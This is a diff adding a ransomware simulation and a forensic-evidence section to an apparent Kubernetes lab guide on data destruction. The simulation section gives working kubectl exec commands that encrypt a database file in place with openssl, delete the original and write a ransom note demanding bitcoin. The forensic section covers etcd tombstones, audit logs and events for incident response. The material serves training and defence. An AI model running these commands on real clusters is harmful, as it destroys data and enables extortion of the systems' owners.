@@ -182,6 +182,68 @@ Or the namespace itself may already be missing:
 Error from server (NotFound): namespaces "stateful-app" not found
 ```
 
+## Ransomware Simulation
+
+Instead of outright deletion, an attacker may encrypt data in place and demand payment — the Kubernetes equivalent of ransomware. This section demonstrates the technique on the PVC-backed volume.
+
+> **Warning:** This is a controlled lab exercise. Never run these commands against production systems.
+
+Before encryption — verify the data is readable:
+
+```bash
+DB_POD=$(kubectl get pod -n stateful-app -l app=database -o jsonpath='{.items[0].metadata.name}')
+kubectl exec -n stateful-app "$DB_POD" -- cat /data/db/records.dat
+```
+
+Encrypt the data file with AES-256-CBC and remove the original:
+
+```bash
+kubectl exec -n stateful-app "$DB_POD" -- sh -c '
+  openssl enc -aes-256-cbc -salt -pbkdf2 \
+    -in /data/db/records.dat \
+    -out /data/db/records.dat.enc \
+    -k "attacker-controlled-passphrase"
+  rm /data/db/records.dat
+'
+```
+
+Leave a ransom note:
+
+```bash
+kubectl exec -n stateful-app "$DB_POD" -- sh -c '
+  cat > /data/db/RANSOM_NOTE.txt << "EOF"
+Your data has been encrypted. All .dat files are now AES-256 encrypted.
+Send 2 BTC to bc1q...fake... to receive the decryption key.
+Do not restart the pod or the encryption key context will be lost.
+EOF'
+```
+
+After encryption — inspect the data directory:
+
+```bash
+kubectl exec -n stateful-app "$DB_POD" -- ls -la /data/db/
+```
+
+Expected output:
+
+```
+-rw-r--r-- 1 root root  160 ... records.dat.enc
+-rw-r--r-- 1 root root  203 ... RANSOM_NOTE.txt
+```
+
+The original `records.dat` is gone. Only the encrypted blob and ransom note remain.
+
+## Forensic Evidence
+
+Even after data destruction, forensic artifacts survive in the cluster infrastructure:
+
+- **etcd tombstones** — Deleted Kubernetes objects leave tombstone records in etcd for the compaction interval (default 5 minutes). A forensic responder with etcd access can recover recently deleted resource definitions.
+- **Kubernetes audit logs** — If audit logging is enabled (`--audit-policy-file`), every `delete` and `exec` API call is recorded with the user identity, timestamp, and target resource.
+- **PV reclaim policy** — PersistentVolumes with `Retain` reclaim policy preserve the underlying storage even after PVC deletion. Check `kubectl get pv -o jsonpath='{.items[*].spec.persistentVolumeReclaimPolicy}'` to identify recoverable volumes.
+- **Kubernetes events** — `kubectl get events -A --sort-by=.lastTimestamp` captures recent deletions, pod terminations, and volume detach operations. Events persist for 1 hour by default.
+
+> **Tip:** In incident response, collect etcd snapshots and audit logs before restarting components. These are the primary evidence sources for reconstructing a data destruction timeline.
+
 ## Cleanup
 
 If you need to re-deploy the scenario after running through the destruction steps:
